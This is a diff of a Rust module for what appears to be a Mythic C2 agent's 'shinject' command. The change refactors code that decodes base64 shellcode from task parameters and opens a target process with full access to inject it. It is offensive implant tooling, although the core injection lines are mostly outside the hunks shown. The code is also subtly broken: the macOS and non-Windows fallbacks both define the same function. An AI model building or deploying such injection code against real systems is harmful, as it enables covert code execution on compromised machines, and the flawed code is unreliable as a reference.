@@ -1,6 +1,9 @@
 use std::mem;
 use std::ptr;
 use serde::{Deserialize, Serialize};
+use crate::{AgentTask, mythic_success, mythic_error};
+use crate::agent::ShinjectArgs;
+use base64::{Engine as _, engine::general_purpose};
 
 #[cfg(target_os = "windows")]
 use winapi::um::winnt::*;
@@ -13,24 +16,9 @@ use winapi::um::handleapi::*;
 #[cfg(target_os = "windows")]
 use winapi::um::synchapi::*;
 #[cfg(target_os = "windows")]
-use winapi::shared::minwindef::*;
-#[cfg(target_os = "windows")]
-use winapi::shared::ntdef::*;
+use winapi::shared::minwindef::{FALSE, TRUE};
 
-// Command structure for Mythic
-#[derive(Serialize, Deserialize)]
-pub struct ShinjectArgs {
-    pub shellcode: String,  // File ID from Mythic
-    pub process_id: u32,
-}
 
-#[cfg(target_os = "windows")]
-#[derive(Serialize)]
-pub struct ShinjectResult {
-    pub success: bool,
-    pub output: String,
-    pub error: Option<String>,
-}
 
 #[cfg(target_os = "windows")]
 const PAGE_EXECUTE_READWRITE: DWORD = 0x40;
@@ -43,40 +31,31 @@ const PROCESS_ALL_ACCESS: DWORD = 0x1F0FFF;
 #[cfg(target_os = "windows")]
 const INFINITE: DWORD = 0xFFFFFFFF;
 
-// Main command execution function
+// Main command execution function for Mythic
 #[cfg(target_os = "windows")]
-pub fn execute_shinject(args: ShinjectArgs, task_id: &str) -> Result<String, String> {
-    // This function would need access to your Mythic RPC functions to download the file
-    // For now, we'll assume the shellcode is passed as base64 or we have a way to get it
+pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
+    // Parse arguments from task parameters
+    let args: ShinjectArgs = serde_json::from_str(&task.parameters)?;
     
-    // In a real implementation, you would:
-    // 1. Download the shellcode file from Mythic using the file_id
-    // 2. Decode it from base64 if necessary
-    // 3. Inject it into the target process
-    
-    // Since we don't have the file download mechanism in this example,
-    // we'll assume the shellcode is provided as base64 in the args
-    // In reality, you'd use your agent's file download functionality
-    
-    let shellcode_bytes = match base64::decode(&args.shellcode) {
+    // For now, we'll assume the shellcode is passed as base64
+    // In a real implementation, you would download the file from Mythic using the file_id
+    let shellcode_bytes = match general_purpose::STANDARD.decode(&args.shellcode) {
         Ok(bytes) => bytes,
         Err(_) => {
-            // If it's not base64, try to use it as raw file content
-            // In practice, you'd download the file from Mythic
-            return Err("Shellcode must be base64 encoded or file download must be implemented".to_string());
+            return Ok(mythic_error!(task.id, "Shellcode must be base64 encoded or file download must be implemented"));
         }
     };
     
     unsafe {
-        match inject_shellcode(args.process_id, &shellcode_bytes) {
-            Ok(output) => Ok(output),
-            Err(e) => Err(e),
+        match inject_shellcode_impl(args.process_id, &shellcode_bytes) {
+            Ok(output) => Ok(mythic_success!(task.id, output)),
+            Err(e) => Ok(mythic_error!(task.id, e)),
         }
     }
 }
 
 #[cfg(target_os = "windows")]
-unsafe fn inject_shellcode(process_id: u32, shellcode: &[u8]) -> Result<String, String> {
+unsafe fn inject_shellcode_impl(process_id: u32, shellcode: &[u8]) -> Result<String, String> {
     let h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
     if h_process.is_null() {
         return Err(format!("Failed to open process with PID: {}. Error: {}", 
@@ -144,14 +123,14 @@ unsafe fn inject_shellcode(process_id: u32, shellcode: &[u8]) -> Result<String, 
 
 // macOS placeholder implementation
 #[cfg(target_os = "macos")]
-pub fn execute_shinject(_args: ShinjectArgs, _task_id: &str) -> Result<String, String> {
-    Err("shinject command is not implemented for macOS".to_string())
+pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
+    Ok(mythic_error!(task.id, "shinject command is not implemented for macOS"))
 }
 
 // Fallback for other platforms
 #[cfg(not(target_os = "windows"))]
-pub fn execute_shinject(_args: ShinjectArgs, _task_id: &str) -> Result<String, String> {
-    Err("shinject command is only supported on Windows".to_string())
+pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
+    Ok(mythic_error!(task.id, "shinject command is only supported on Windows"))
 }
 
 #[cfg(test)]
